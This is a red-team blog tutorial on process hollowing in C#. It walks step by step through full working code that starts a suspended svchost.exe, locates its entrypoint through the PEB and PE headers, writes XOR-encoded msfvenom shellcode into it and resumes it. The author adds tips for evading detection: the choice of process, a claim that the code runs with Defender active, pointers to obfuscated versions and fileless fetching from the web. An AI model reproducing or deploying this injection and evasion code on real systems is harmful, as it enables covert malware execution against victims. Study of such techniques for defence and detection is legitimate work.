---
title: "Shellcode Injection in C# - Part 2 - Process Hollowing"
author:
  name: crypt0ace
  link: https://twitter.com/crypt0acee
date: 2022-09-09
description: "Discussing shellcode injection techniques we can use while utilizing C#"
tags: [Red Team]
---
## Introduction
This post is part 2 of shellcode injection techniques. You can read part 1 [here](https://crypt0ace.github.io/posts/Shellcode-Injection-Techniques/). In this one, we will look into Process Hollowing in C#.

## Process Hollowing
Process Hollowing is a technique in which we use a legitimate process, inject it with our shellcode and make the process run our shellcode. According to [Mitre](https://attack.mitre.org/techniques/T1055/012/) *Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as `CreateProcess`, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as `ZwUnmapViewOfSection` or `NtUnmapViewOfSection` before being written to, realigned to the injected code, and resumed via `VirtualAllocEx`, `WriteProcessMemory`, `SetThreadContext`, then `ResumeThread` respectively.*
<br>
Nice. We know what imports we have to make. The flow chart of API calls will go like this
<br>
![Process Hollowing API Calls](/assets/img/shellcode-injections-2/api-calls.png)
<br>
So we will be first creating a process in a suspended state using `CreateProcess`, query the process using `ZwQueryInformationProcess`, get some values using `ReadProcessMemory`, write our shellcode using `WriteProcessMemory` and then resume the thread using `ResumeThread`.

### Imports
We can start writing the code with these API imports. Using the Windows Docs and the calls we need, we get the imports as
```csharp
[DllImport("kernel32.dll")]
public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref IntPtr lpNumberOfBytesWritten);

[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

[DllImport("kernel32.dll")]
public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

[DllImport("ntdll.dll")]
public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

[DllImport("kernel32.dll", SetLastError = true)]
public static extern uint ResumeThread(IntPtr hThread);
```
Pretty self explanatory. Look at my previous posts if this confuses you.
<br>
We also need some structs and enums for this to work. These are `STARTUPINFO`, `PROCESS_INFORMATION` and `PROCESS_BASIC_INFORMATION`. These stucts, in the C# format can be found at [Pinvoke](https://www.pinvoke.net/index.aspx) website. We also have the `SUSPENDED` state which we will provide as a creation flag to `CreateProcess` to create a process in a suspended state. All combined these become
```csharp
[StructLayout(LayoutKind.Sequential)]
internal struct PROCESS_BASIC_INFORMATION
{
  public IntPtr ExitStatus;
  public IntPtr PebAddress;
  public IntPtr AffinityMask;
  public IntPtr BasePriority;
  public IntPtr UniquePID;
  public IntPtr InheritedFromUniqueProcessId;
}

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
public struct STARTUPINFO
{
 public Int32 cb;
 public string lpReserved;
 public string lpDesktop;
 public string lpTitle;
 public Int32 dwX;
 public Int32 dwY;
 public Int32 dwXSize;
 public Int32 dwYSize;
 public Int32 dwXCountChars;
 public Int32 dwYCountChars;
 public Int32 dwFillAttribute;
 public Int32 dwFlags;
 public Int16 wShowWindow;
 public Int16 cbReserved2;
 public IntPtr lpReserved2;
 public IntPtr hStdInput;
 public IntPtr hStdOutput;
 public IntPtr hStdError;
}
[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{
 public IntPtr hProcess;
 public IntPtr hThread;
 public int dwProcessId;
 public int dwThreadId;
}
public static class CreationFlags
{
 public const uint SUSPENDED = 0x4;
}
public const int PROCESSBASICINFORMATION = 0;
```
These can be found here

- [PROCESS_BASIC_INFORMATION](https://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html)
- [STARTUPINFO](https://www.pinvoke.net/default.aspx/Structures/STARTUPINFO.html)
- [PROCESS_INFORMATION](https://www.pinvoke.net/default.aspx/Structures/PROCESS_INFORMATION.html)

### Main Method
Now that we have the imports and structs set we can get into it. 
<br>
First we will create our process in a suspended state. The process can be anything for a POC but use something that would be less sus to avoid detections. We also need to initialize some objects that we are going to use late.
```csharp
PROCESS_INFORMATION proc_info = new PROCESS_INFORMATION();
STARTUPINFO startup_info = new STARTUPINFO();
PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();

string path = @"C:\\Windows\\System32\\svchost.exe";
bool procINIT = CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED,
                IntPtr.Zero, null, ref startup_info, ref proc_info);
```
To make sure the process created sucessfully we can use a simple if statement and use `procINIT`
```csharp
if (procINIT == true)
{
  Console.WriteLine("[*] Process create successfully.");
  Console.WriteLine("[*] Process ID: {0}", proc_info.dwProcessId);
}
else
{
  Console.WriteLine("[-] Could not create the process.");
}
```
The process ID is fetched from the `PROCESS_INFORMATION` struct that we initialized.
<br>
Paste the shellcode obtained from `msfvenom` now. Ill be using the calc popping shellcode again but this time I'll also be XOR encrypting it using `msfvenom`. The command becomes
```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f csharp EXITFUNC=thread --encrypt xor --encrypt-key z
```
And the decrypting shellcode part is
```csharp
for (int i = 0; i < buf.Length; i++)
{
  buf[i] = (byte)(buf[i] ^ (byte)'z');
}
```
Then we need to get the PEB or Process Environment Block of the process in suspended state. THe PEB is a memory structure that every process has and it comtains some interesting fields that we can use to calculate things like `ImageBaseAddress`, which is what we are going to do. But first we need to query the process to get the PEB Address and then add [`0x10`](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/peb/index.htm) offset to it to get the pointer to the base image address. We can get the `PebAddress` from the `PROCESS_BASIC_INFORMATION` struct that we have.
<br>
For the API `ZwQueryInformationProcess` we will need a process handle, which we can retrieve from `PROCESS_INFORMATION`. The second parameter is `procInformationClass` which from the Microsoft Docs, we can set to 0 to get a pointer to the PEB structure. Then we can calculate the pointer to image base address with adding PEB Address and an offset of `0x10`.  
```csharp
uint retLength = 0;
IntPtr procHandle = proc_info.hProcess;
ZwQueryInformationProcess(procHandle, 0, ref pbi, (uint)(IntPtr.Size * 6), ref retLength);
IntPtr imageBaseAddr = (IntPtr)((Int64)pbi.PebAddress + 0x10);
Console.WriteLine("[*] Image Base Address found: 0x{0}", imageBaseAddr.ToString("x"));
```
Now we need to write the actual shellcode into the entery point address for it to execute. We cant directly write to it because the address changes due to ASLR (Address Space Layout Randomization). So we need to calculate it for each process. That can be done by

- Calculating actual image base adress
- Calculating `e_lfanew` value
- Calculating Entrypoint Relative Virtual Address (RVA)
- Calculating EntryPoint RVA
- Calculating actual abslute entrypoint address
<br>
I know thats a lot. We will be using `ReadProcessMemory` to read the memory for these addresses and calculate them. First we will calculate the actual image base for executable address. We will be setting the base address bytes to `0x8` for x64 process. Then read the memory to those base address bytes of PEB to get the address we need. The 0 in `BitConverter` indicates the starting point. We are reading 8 bytes in as `ToInt64`.
```csharp
byte[] baseAddrBytes = new byte[0x8];
IntPtr lpNumberofBytesRead = IntPtr.Zero;
ReadProcessMemory(procHandle, imageBaseAddr, baseAddrBytes, baseAddrBytes.Length, out lpNumberofBytesRead);
IntPtr execAddr = (IntPtr)(BitConverter.ToInt64(baseAddrBytes, 0));
```
After getting that, we will be reading the memory but this time to `0x200` bytes from the base address we just got to parse the PE structure.
```csharp
byte[] data = new byte[0x200];
ReadProcessMemory(procHandle, execAddr, data, data.Length, out lpNumberofBytesRead);
```
Then we can calculate the `e_lfanew` value which contains the PE Header at the offset of `0x3c`. The value of `e_lfanew` is 4 bytes so we will be using `ToUint32`.
```csharp
uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
Console.WriteLine("[*] e_lfanew: 0x{0}", e_lfanew.ToString("X"));
```
We can get the RVA offset by adding `0x28` into the `e_lfanew` value that we have which contains PE Header pointer.
```csharp
uint rvaOffset = e_lfanew + 0x28;
```
We are going to read 4 bytes into the RVA offset to get the offset of the executable entrypoint address
```csharp
uint rva = BitConverter.ToUInt32(data, (int)rvaOffset);
```
Finally we can add RVA and the base address to get the absolute value of the Entrypoint Address that we can write our shellcode to. 
```csharp
IntPtr entrypointAddr = (IntPtr)((UInt64)execAddr + rva);
Console.WriteLine("[*] Entrypoint Found: 0x{0}", entrypointAddr.ToString("X"));
```
Now that we have the address we need we can write our shellcode in it using `WriteProcessMemory`. We are going to give it the process handle, the entrypoint address we want to write to, the `buf` which contains the shellcode which we are writing, and the length.
```csharp
IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
WriteProcessMemory(procHandle, entrypointAddr, buf, buf.Length, ref lpNumberOfBytesWritten);
```
Once that is done we can resume the thread that we had suspended at the start using `ResumeThread`. We need to give it a thread handle which we can again retrive from the `PROCESS_INFORMATION` struct.
```csharp
IntPtr threadHandle = proc_info.hThread;
ResumeThread(threadHandle);
```
If everything went well you should have execution of your shellcode. If not look at your code again or you can always contact me and I'll be happy to help.
![Shellcode Popping](/assets/img/shellcode-injections-2/pop.png)

## Code
You can find the code at my github [here](https://github.com/crypt0ace/ProcessHollow/blob/main/Program.cs). I have some other functionalities like sleep, courtesy of [Snovvcrash](https://twitter.com/snovvcrash) whose code is [here](https://ppn.snovvcrash.rocks/red-team/maldev/code-injection/process-hollowing). Also made the code look a bit less shitty. There is also a obfucated version present [here](https://github.com/crypt0ace/ProcessHollow/tree/main/Obfuscated%20Version) which was obfuscated using [Rosfuscator](https://github.com/Flangvik/RosFuscator) by [Melvin Langvik](https://twitter.com/flangvik). Works pretty well. I aslo have a powershell script that pulls the executable from the web if not touching disk is your thing. Pretty basic for now. Will be making it like [PowerSharpPack](https://github.com/S3cur3Th1sSh1t/PowerSharpPack) soon.

## Conclusion
Let me know if you need help or whatever. My socials are at the bottom left. If there's any mistakes or something I missed please reach out. This is basic but still executed my shellcode with Defender active. But you can always built upto it with encrypted shellcodes, or not having shellcode at all and fetching it from the web etc. Ill leave that to the reader. If some things might sound new to you I do recommend reading the PE Structure which would help you understand the terms like `e_lfanew`. 

## References
All credits to these amazing posts and code which I constantly found myself reading.

- [Snovvcrash Process Hollowing](https://ppn.snovvcrash.rocks/red-team/maldev/code-injection/process-hollowing)
- [Cas Van Cooten Process Hollowing](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Shellcode%20Process%20Hollowing/Program.cs)
- [Michael Gorelik](https://gist.github.com/smgorelik/9a80565d44178771abf1e4da4e2a0e75)
- [ProcessHollow](https://gist.github.com/affix/994d7b806a6eaa605533f46e5c27fa5e)